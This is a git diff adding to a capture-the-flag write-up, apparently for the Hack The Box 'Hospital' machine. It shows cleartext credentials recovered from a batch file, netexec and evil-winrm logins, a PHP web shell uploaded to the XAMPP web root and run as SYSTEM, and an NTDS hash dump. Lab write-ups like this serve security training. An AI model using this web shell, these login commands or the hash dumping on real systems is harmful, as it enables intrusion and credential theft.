@@ -761,59 +761,150 @@ PS C:\Users\drbrown.HOSPITAL\Documents> whoami
 hospital\drbrown
 ```
 
+### Clear text password - drbrown
+
 ```bash
+PS C:\Users\drbrown.HOSPITAL\Documents> dir
+    Directory: C:\Users\drbrown.HOSPITAL\Documents
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       10/23/2023   3:33 PM            373 ghostscript.bat
+
+
+PS C:\Users\drbrown.HOSPITAL\Documents> type ghostscript.bat
+@echo off
+set filename=%~1
+powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
 ```
 
 ```bash
+"
+    $p = convertto-securestring 'chr!$br0wn' -asplain -force;
+    $c = new-object system.management.automation.pscredential('hospital\drbrown', $p);
+    Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { 
+        cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%"
+    }
+"
 ```
 
 ```bash
+PS C:\Users\drbrown.HOSPITAL\Downloads> dir
+    Directory: C:\Users\drbrown.HOSPITAL\Downloads
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/22/2024   6:42 AM           1615 file01.eps
+```
+
+### RDP - Recover password
+
+```bash
+$ netexec rdp $TARGET -u 'drbrown' -p 'chr!$br0wn'
+RDP         10.10.11.241    3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:hospital.htb) (nla:True)
+RDP         10.10.11.241    3389   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)
+```
+
+![RDP - web - recover pwd](images/rdp_recover_pwd.png)
+
+![RDP - web - pwd clear text](images/rdp_recover_pwd_revelled.png)
+
+```bash
+document.getElementById('rcmloginpwd').value
+"Th3B3stH0sp1t4l9786!"
 ```
 
 ```bash
+$ netexec winrm $TARGET -u 'administrator' -p 'Th3B3stH0sp1t4l9786!'
+WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
+WINRM       10.10.11.241    5985   DC               [+] hospital.htb\administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
 ```
 
 ```bash
+$ evil-winrm -i $TARGET -u 'administrator' -p 'Th3B3stH0sp1t4l9786!'
+Evil-WinRM shell v3.5
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+hospital\administrator
+```
+
+### XAMPP
+
+```bash
+$ netexec winrm $TARGET -u 'drbrown' -p 'chr!$br0wn'
+WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
+WINRM       10.10.11.241    5985   DC               [+] hospital.htb\drbrown:chr!$br0wn (Pwn3d!)
 ```
 
 ```bash
+$ evil-winrm -i $TARGET -u 'drbrown' -p 'chr!$br0wn'                       
+Evil-WinRM shell v3.5
+...
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents>
 ```
 
 ```bash
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----       10/21/2023   5:12 PM                ExchangeSetupLogs
+d-----       10/22/2023   9:48 PM                inetpub
+d-----        11/5/2022  12:03 PM                PerfLogs
+d-r---       11/13/2023   6:05 PM                Program Files
+d-----       10/22/2023  10:01 PM                Program Files (x86)
+d-----         9/6/2023   3:50 AM                root
+d-r---         9/6/2023   7:57 AM                Users
+d-----       11/13/2023   6:05 PM                Windows
+d-----       10/22/2023  10:10 PM                xampp
+-a----       10/21/2023   4:34 PM             32 BitlockerActiveMonitoringLogs
 ```
 
 ```bash
+*Evil-WinRM* PS C:\> cd C:\xampp\htdocs
+*Evil-WinRM* PS C:\xampp\htdocs>
+```
+
+If I try to create direct on the target a .php file with some commands using echo, it does not work. But if I create it locally on my kali and uploda it to the xampp web root directory, it works, and I can access it.
+
+```bash
+*Evil-WinRM* PS C:\xampp\htdocs> upload shell.php
+Info: Uploading /home/kali/Desktop/HTB/Hospital/shell.php to C:\xampp\htdocs\shell.php
+Data: 48 bytes of 48 bytes copied
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\xampp\htdocs> dir shell.php
+    Directory: C:\xampp\htdocs
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/22/2024   8:16 AM             38 shell.php
+
+*Evil-WinRM* PS C:\xampp\htdocs> cat shell.php
+<?php
+    system($_REQUEST['cmd']);
+?>
 ```
 
 ```bash
+$ curl --insecure https://10.10.11.241/shell.php?cmd=whoami 
+nt authority\system
 ```
 
-```bash
-```
+You can now start a listener and get a reverse shell.
+
+## Extra
+
+Dump NTDS - specific user
 
 ```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
-```
-
-```bash
+$ netexec smb $TARGET -u 'administrator' -p 'Th3B3stH0sp1t4l9786!' --ntds --user administrator
+SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.241    445    DC               [+] hospital.htb\administrator:Th3B3stH0sp1t4l9786! (Pwn3d!)
+SMB         10.10.11.241    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.11.241    445    DC               hospital.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1a0158142556cfc5aa9fdb974e0352f:::
+SMB         10.10.11.241    445    DC               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/DC_10.10.11.241_2024-08-20_103550.ntds of which 1 were added to the database
 ```
